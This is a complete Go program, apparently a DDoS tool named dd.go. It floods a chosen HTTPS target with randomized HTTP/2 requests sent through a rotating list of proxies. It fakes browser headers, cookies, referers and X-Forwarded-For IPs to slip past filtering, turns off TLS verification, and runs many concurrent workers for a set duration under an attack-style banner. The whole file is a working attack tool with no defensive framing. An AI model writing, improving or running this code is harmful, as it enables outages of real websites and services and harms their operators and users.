package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

var (
	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/json, text/plain, */*",
		"application/json, text/plain, */*;q=0.9,application/xml;q=0.8",
		"application/json;q=0.9,text/plain;q=0.8, */*;q=0.7",
		"application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	}
	langHeaders = []string{
		"en-US", "en-GB", "ko-KR", "zh-CN", "zh-TW", "ja-JP", "en-AU", "en-CA",
		"fr-FR", "de-DE", "es-ES", "it-IT", "nl-NL", "pt-BR", "ru-RU",
	}
	encodingHeaders = []string{
		"*", "gzip", "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "br",
	}
	controlHeaders = []string{
		"max-age=604800", "no-cache", "no-store", "public, max-age=0", "private, max-age=0, no-store, no-cache, must-revalidate",
	}
	userAgents = []string{
		`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3`,
		`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36`,
		`Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36`,
		`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0`,
		`Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1`,
		`Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1`,
		`Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36`,
	}
	additionalHeaders = []map[string]string{
		{"origin": ""},
		{"x-requested-with": "XMLHttpRequest"},
		{"cache-control": "private"},
		{"accept-charset": "UTF-8"},
		{"geo-location": "UNKNOWN"},
		{"x-forwarded-for": ""},
		{"width": "1920"},
		{"dnt": "1"},
		{"sec-ch-ua": ""},
		{"sec-ch-ua-mobile": "?0"},
		{"sec-fetch-site": "same-origin"},
		{"sec-fetch-mode": "navigate"},
		{"sec-fetch-user": "?1"},
		{"sec-fetch-dest": "document"},
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func randomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func randomElement(list []string) string {
	return list[rand.Intn(len(list))]
}

func randomMethod() string {
	methods := []string{"GET", "POST", "HEAD"}
	return methods[rand.Intn(len(methods))]
}

func randomBody() io.Reader {
	size := rand.Intn(5000) + 100
	return strings.NewReader(randomString(size))
}

func buildHeaders(host, path string) http.Header {
	h := http.Header{}
	h.Set(":method", randomMethod())
	h.Set(":authority", host)
	h.Set(":scheme", "https")
	h.Set(":path", path)

	h.Set("user-agent", randomElement(userAgents))
	h.Set("accept", randomElement(acceptHeaders))
	h.Set("accept-encoding", randomElement(encodingHeaders))
	h.Set("accept-language", randomElement(langHeaders))
	h.Set("cache-control", randomElement(controlHeaders))
	h.Set("referer", fmt.Sprintf("https://www.google.com/search?q=%s", randomString(10)))

	cookie := fmt.Sprintf("session=%s; token=%s; uid=%s",
		randomString(20), randomString(30), randomString(10))
	h.Set("Cookie", cookie)

	if rand.Intn(2) == 0 {
		h.Set("Range", fmt.Sprintf("bytes=%d-%d", rand.Intn(1000), rand.Intn(1000)+500))
	}

	if rand.Intn(3) == 0 {
		h.Set("X-Custom-Header", randomString(200))
	}

	extra := additionalHeaders[rand.Intn(len(additionalHeaders))]
	for k, v := range extra {
		switch k {
		case "origin":
			h.Set(k, fmt.Sprintf("https://%s", host))
		case "x-forwarded-for":
			h.Set(k, randomIP())
		case "sec-ch-ua":
			h.Set(k, fmt.Sprintf(`"Google Chrome";v="%d", "Chromium";v="%d", "Not=A?Brand";v="%d"`,
				rand.Intn(100), rand.Intn(100), rand.Intn(100)))
		default:
			h.Set(k, v)
		}
	}
	return h
}

func runFlooder(ctx context.Context, target *url.URL, proxyAddr string, rate int) {
	transport := &http.Transport{
		ForceAttemptHTTP2: true,
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			conn, err := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
			if err != nil {
				return nil, err
			}
			connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\n\r\n", addr, addr)
			if _, err := conn.Write([]byte(connectReq)); err != nil {
				conn.Close()
				return nil, err
			}
			reader := bufio.NewReader(conn)
			resp, err := http.ReadResponse(reader, nil)
			if err != nil || resp.StatusCode != 200 {
				conn.Close()
				return nil, fmt.Errorf("proxy CONNECT failed")
			}
			resp.Body.Close()
			tlsConfig := &tls.Config{
				ServerName:         target.Host,
				InsecureSkipVerify: true,
				CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
				CipherSuites: []uint16{
					tls.TLS_AES_128_GCM_SHA256,
					tls.TLS_AES_256_GCM_SHA384,
					tls.TLS_CHACHA20_POLY1305_SHA256,
				},
				NextProtos: []string{"h2"},
			}
			tlsConn := tls.Client(conn, tlsConfig)
			if err := tlsConn.Handshake(); err != nil {
				conn.Close()
				return nil, err
			}
			return tlsConn, nil
		},
		TLSClientConfig: &tls.Config{
			ServerName:         target.Host,
			InsecureSkipVerify: true,
			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
			},
			NextProtos: []string{"h2"},
		},
	}
	http2.ConfigureTransport(transport)
	client := &http.Client{Transport: transport}

	path := target.Path
	if strings.Contains(path, "%RAND%") {
		path = strings.ReplaceAll(path, "%RAND%", randomString(16))
	}
	if path == "" {
		path = "/"
	}

	ticker := time.NewTicker(time.Duration(10+rand.Intn(10)) * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			var wg sync.WaitGroup
			for i := 0; i < rate; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					query := fmt.Sprintf("?%s=%s", randomString(5), randomString(8))
					fullPath := path + query
					reqURL := &url.URL{
						Scheme: target.Scheme,
						Host:   target.Host,
						Path:   fullPath,
					}
					method := randomMethod()
					var body io.Reader
					if method == "POST" && rand.Intn(2) == 0 {
						body = randomBody()
					}
					req, err := http.NewRequest(method, reqURL.String(), body)
					if err != nil {
						return
					}
					headers := buildHeaders(target.Host, fullPath)
					for k, v := range headers {
						req.Header.Set(k, v[0])
					}
					if body != nil {
						req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					}
					resp, err := client.Do(req)
					if err == nil && resp != nil {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()
					}
				}()
			}
			wg.Wait()
		}
	}
}

func worker(ctx context.Context, target *url.URL, proxies []string, rate int) {
	ticker := time.NewTicker(10 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			proxy := proxies[rand.Intn(len(proxies))]
			go runFlooder(ctx, target, proxy, rate)
		}
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run dd.go <target> <duration_seconds> <rate> <threads>")
		fmt.Println("Proxy file 'proxy.txt' must be in the same directory.")
		os.Exit(1)
	}
	targetStr := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Duration No Settings! :", err)
		os.Exit(1)
	}
	rate, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Rate Invalid! :", err)
		os.Exit(1)
	}
	threads := 1
	if len(os.Args) >= 5 {
		threads, err = strconv.Atoi(os.Args[4])
		if err != nil {
			fmt.Println("Threads/Worker Invalid!", err)
			os.Exit(1)
		}
	}

	data, err := os.ReadFile("proxy.txt")
	if err != nil {
		fmt.Println("Proxy Error :", err)
		os.Exit(1)
	}
	lines := strings.Split(string(data), "\n")
	var proxies []string
	for _, p := range lines {
		p = strings.TrimSpace(p)
		if p != "" && strings.Contains(p, ":") {
			proxies = append(proxies, p)
		}
	}
	if len(proxies) == 0 {
		fmt.Println("Pastikan Proxy Tersedia!")
		os.Exit(1)
	}

	target, err := url.Parse(targetStr)
	if err != nil || target.Scheme != "https" {
		fmt.Println("Link Tidak Valid!", err)
		os.Exit(1)
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("ޗ | Target : %s\n", target.Host)
	fmt.Printf("ޗ | Time   : %d/s\n", duration)
	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
	fmt.Printf("ޗ | Worker : %d\n", threads)
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	for i := 0; i < threads; i++ {
		go worker(ctx, target, proxies, rate)
	}

	<-ctx.Done()
	fmt.Println("Done!")
}
